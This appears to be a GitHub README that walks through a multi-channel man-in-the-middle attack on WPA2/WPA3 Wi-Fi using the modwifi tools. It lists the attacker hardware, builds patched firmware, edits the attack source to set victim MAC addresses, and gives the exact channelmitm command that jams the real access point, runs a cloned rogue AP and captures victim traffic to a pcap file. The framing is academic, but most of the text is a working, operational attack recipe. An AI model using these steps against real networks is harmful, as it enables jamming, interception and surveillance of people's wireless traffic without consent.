# Multi Channel Man-in-the-Middle Attacks Against Protected Wi-Fi Networks
This repository describes how to perform MC-MitM (Base Variant) attack using [modwifi tools](https://github.com/vanhoefm/modwifi).To successfully implement this attack, it is important to keep specific linux OS kernels, Wi-Fi cards and several changes in the attack codes. Here, I explain about various procedures to perform the MC-MitM attack on WPA2/3 networks.    

## Attack Environment Setup
<p align="center">
  <img src="https://github.com/maneshthankappan/Multi-Channel-Man-in-the-Middle-Attacks-Against-Protected-Wi-Fi-Networks-By-Base-Variant-/blob/main/MC-MitM-Base%20Variant-Attack%20Setup.jpeg">
</p>

## Specification of devices used
* Attacker Machine
  * Toshiba Portge
  * OS: XUbuntu 16.04.7 LTS
  * Kernel: 4.4.0-210-generic (Verify your kernel using "uname -r" command)
  * Three Wi-Fi Cards: TP-LINK WN722N-V1, Qualcomm Atheros Communications AR9271 (Driver: ath9k_htc)
  * Two Wi-Fi cards working on two different channels and one for jamming the original channel of the Wi-Fi router

* Victim Device 1
  * Dell Inspiron 15 30000 series
  * OS: Microsoft 10
  * Wireless Security: WPA3-PSK
  
 
* Access Point:
  * TP-LINK Wireless N Router (TL-WR841N)
  * Hardware Version: A2
  * Firmware Version: 8.04
  * Operating mode:802.11g
  * Configured with 50% TX power and channel 1
  * SSID:Smart-Home-AP2
  * Wireless Security: WPA2/WPA3-PSK
  * Encryption Algorithm: CCMP
  
## Prerequisites and Installation Procedure
### 1. Install the following dependencies on Xubuntu
```
$sudo apt-get update
$sudo apt-get install build-essential libncurses-dev bison flex libssl-dev
$sudo apt-get install g++ libssl-dev libnl-3-dev libnl-genl-3-dev cmake

```
Note:It is better to install each package indiviually
### 2. Install the following modwifi package
Various modwifi packages can be downloaded from [this link](https://github.com/vanhoefm/modwifi/tree/master/releases) according to your linux kernel. However,I use the package "modwifi-4.4-1.tar.gz" since my linux kernal is 4.4. Moreover, a linux with kernel version 4.4 or below is required to compile firmware of ath9k_htc as described in next step. Then perform the following..
```
$mkdir modwifi && cd modwifi
$wget https://github.com/vanhoefm/modwifi/raw/master/releases/modwifi-4.4-1.tar.gz
$tar -xf modwifi-4.4-1.tar.gz
$cd drivers && make defconfig-ath9k-debug
$make
$sudo make install
$reboot
```
### 3. Update firmware of Wi-Fi cards
Backup your Wi-Fi cardś driver and modify them using the following commands
```
compgen -G /lib/firmware/ath9k_htc/*backup || for FILE in /lib/firmware/ath9k_htc/*; do sudo cp $FILE ${FILE}_backup; done
```
To compile and update new firmware, clone the [ath9k-htc repository ](https://github.com/vanhoefm/modwifi-ath9k-htc) or download the ZIP folder, extract the folder, and perform the following
```
$make toolchain
$make -C target_firmware
```
At the end, two new files named "htc_7010.fw" and "htc_9271.fw" will be appeared in the folder named "target_firmware". Now, replace these two files respectively with "htc_7010-1.4.0.fw" and "htc_9271-1.4.0.fw" located in "/lib/fimware/ath9k_htc" directory. This can be done by 
```
$sudo cp /home/manesh/Desktop/modwifi-ath9k-htc-research/target_firmware/htc_7010.fw /lib/firmware/ath9k_htc/htc_7010-1.4.0.fw
$reboot
```
### 4. Update and compile attack codes
First, we need to rectify certain bugs in the sources codes of MC-MitM attack. As an easy step, modified sources codes/tools can be downloaded from [this link](https://github.com/Rot127/modwifi-tools/tree/modernization). Downalod the ZIP folder and extract it, which will create a folder named "modwifi-tools-modernization". Then do the following
```
1. Go to modwifi-tools-modernization folder
2. open channelmitm.cpp file
3. Edit MAC address of the client/victim devices in lines 52 and 53 respectively.Save the channelmitm.cpp file.
4. Compile all files using following commands
   $cmake CMakeLists.txt 
   $make all
```
## Attack Tool Usage
 Before executing tool, we need to enable monitor mode on three interfaces. Use  `airmon-ng` or `iwconfig` command to retrive names of wireless interfaces. Then  use the following script (available in Tools folder) to enable monitor mode on wireless interfaces.
 Be inside "modwifi-tools-modernization" folder.
 ```
 $sudo ./config_dongle.sh -i wlan# -k
 ```
 The attack tool can be executed using follwoing command line arguments. Download attack folder from the link (Under construction). 

 ```
 $sudo ./channelmitm -a wlan0 -c wlan1 -j wlan2 -s Smart-Home-AP2 -d mitm.pcap --dual
 ```
 ### Below are the details of wireless interfaces
 
 * `wlan0`: Wireless interface on the channel of AP which listens and injects packets on the real channel
 * `wlan1`: Wireless interface that runs the Rogue AP or cloned AP
 * `wlan2`: Wireless Interface used to jam the targeted AP
 * `Smart-Home-AP2`: SSID of the target network
 * `mitm.pcap`: Capture traffic from cloned AP to clients to .pcap file
 * `dual`: Indicates that attack targets both connected clients
 * You can see many other options running `sudo ./channelmitm`
 ### Troubleshooting
 ##### General troubleshooting 
 General troubleshooting procedures can be found in [this link](https://github.com/vanhoefm/modwifi#troubleshooting).
 ##### Other Common errors
 Some common errors while executing channelmitm are: 
 * "One or more test failed on the given interfaces", 
 * "Failed to ping wlan#".   
 In above cirumstances, verify whether firmware are correctly modified in respective folder. 
 
 Another common error is the display of "." even after the attack started. This is because,
 * The target client is still associated with the real AP, because something went wrong with the jamming.
 * The beacon packet is received by the target client and it responds, but the fake client sends the incorrect probe request to the AP.
 For example, if you use TL-WN722N to send out a probe request with AWUS036NHA-tags set, the handshake will fail sometimes. 
 This is beacuse  each dongle has some specific  hardware properties it embeds in the probe request as tags.
 To rectify above issues, it is necessary to update tag sets used in probe responses function of channelmitm.cpp. Goto line # 13689 or find "get_probe_response" 
 function and update the following two codes in it. The codes are
 ```
 uint8_t *probereqtags = tl_probe_tags;
 uint8_t probetagslen = tl_probe_tags_len;
 ```
 In my case, I use TL-WN722N. So I update as above. Appropriate tags can be found in "probe_requests.h" header file in "modwifi-tools-modernization" folder.

 ## Notes
 This attack is initially intended to expoit vulnerabilities with TKIP in WPA. We do not perfrom any such exploitations. Instead, We acquired MC-MitM position against WPA2/3 networks and successfully captured the encrypted the wireless frames between the victim and the AP by snooping on channels. 
 ## Sample screen shorts





### References

  * https://github.com/vanhoefm/modwifi
  * https://papers.mathyvanhoef.com/acsac2014.pdf


